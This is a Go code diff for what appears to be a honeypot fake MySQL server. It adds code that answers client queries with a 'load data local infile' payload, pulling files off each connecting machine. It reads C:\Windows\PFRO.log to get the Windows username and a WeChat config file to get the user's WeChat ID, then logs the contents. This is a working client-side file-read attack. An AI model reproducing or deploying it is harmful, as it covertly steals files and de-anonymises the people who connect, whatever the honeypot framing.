@@ -213,11 +213,17 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 	l.handler.SessionInc(session)
 	defer l.handler.SessionDec(session)
 
-	readK := session.conn.RemoteAddr().String() + "read" //存储是否在进行读取任务
+	log.Println("statementID-----------", session.id)
 
-	unameK := session.conn.RemoteAddr().String() + "username" //存储电脑用户名
+	readK := session.RemoteIP() + "read" //存储是否在进行读取任务
+
+	unameK := session.RemoteIP() + "username" //存储电脑用户名
+
+	lastCmdK := session.RemoteIP() + "lastcmd"
 
 	const PRO_FILE_NAME = "C:\\Windows\\PFRO.log"
+
+	const WX_CONFIG = "D:\\wz\\WeChat Files\\All Users\\config\\config.data"
 	// Reset packet sequence ID.
 	session.packets.ResetSeq()
 	for {
@@ -228,20 +234,60 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 		// return
 		// log.Println("data====", "----------", string(data), "statementID", session.statementID)
 
+		//处理获取  "C:\\Windows\\PFRO.log"
 		if utils.GetItemString(readK) == PRO_FILE_NAME {
 
-			log.Println("收数据\n", string(data))
+			content := string(data)
+			// log.Println("收数据\n", content)
 
-			name := utils.GetUserName(string(data))
+			//记录日志
+			extend := make(map[string]any)
+			extend["filename"] = PRO_FILE_NAME
+			extend["content"] = content
+
+			name := utils.GetUserName(content)
 			if name != "" {
+				utils.SetItem(unameK, name)
 				log.Println("获取", unameK, "用户名成功为:", name)
 
-				utils.SetItem(unameK, name)
+				extend["winname"] = name
+				jsonlog.GlobalLog.HoneyLog(session.conn.LocalAddr().String(), session.conn.RemoteAddr().String(), "control", extend)
 
 			} else {
 				log.Println("获取", unameK, "用户名失败")
+				jsonlog.GlobalLog.HoneyLog(session.conn.LocalAddr().String(), session.conn.RemoteAddr().String(), "control", extend)
 			}
+		}
 
+		//处理获取  "C:\\Windows\\PFRO.log"
+		if utils.GetItemString(readK) == WX_CONFIG {
+
+			content := string(data)
+			log.Println("收数据\n", content)
+
+			//记录日志
+			extend := make(map[string]any)
+			extend["filename"] = WX_CONFIG
+			extend["content"] = content
+			jsonlog.GlobalLog.HoneyLog(session.conn.LocalAddr().String(), session.conn.RemoteAddr().String(), "control", extend)
+
+			name := utils.GetWechatId(content)
+			if name != "" {
+				log.Println("获取", unameK, "微信id:", name)
+
+				extend["wechat"] = content
+				jsonlog.GlobalLog.HoneyLog(session.conn.LocalAddr().String(), session.conn.RemoteAddr().String(), "control", extend)
+				utils.SetItem(unameK, name)
+
+			} else {
+				log.Println("获取", unameK, "微信id失败")
+			}
+		}
+
+		log.Println(lastCmdK, utils.GetItemString(lastCmdK))
+		if utils.GetItemString(lastCmdK) != "" {
+
+			data = []byte(utils.GetItemString(lastCmdK))
 		}
 
 		// Update the session last query time for session idle.
@@ -272,12 +318,18 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 		case sqldb.COM_QUERY:
 
 			// load data local infile 'D:/ioc.txt' into table users fields terminated by '\n'
-			if err = session.packets.Write(utils.GetPayload(PRO_FILE_NAME)); err != nil {
-				log.Error("TRBULAR: %v", err)
-				return
-			} else {
-				utils.SetItem(readK, PRO_FILE_NAME)
-				continue
+			log.Println(unameK, utils.GetItemString(unameK))
+			if utils.GetItemString(unameK) == "" || utils.GetItemString(lastCmdK) == "" {
+				if err = session.packets.Write(utils.GetPayload(PRO_FILE_NAME)); err != nil {
+					log.Error("TRBULAR: %v", err)
+					return
+				} else {
+					log.Println("发数据------------------")
+					utils.SetItem(readK, PRO_FILE_NAME)
+					utils.SetItem(lastCmdK, string(data))
+					time.Sleep(10 * time.Millisecond)
+					continue
+				}
 			}
 			query := l.parserComQuery(data)
 			if err = l.handler.ComQuery(session, query, nil, func(qr *sqltypes.Result) error {
@@ -364,6 +416,9 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 			}
 		}
 		// Reset packet sequence ID.
+
+		// utils.SetItem(lastCmdK, "")
+
 		session.packets.ResetSeq()
 	}
 }
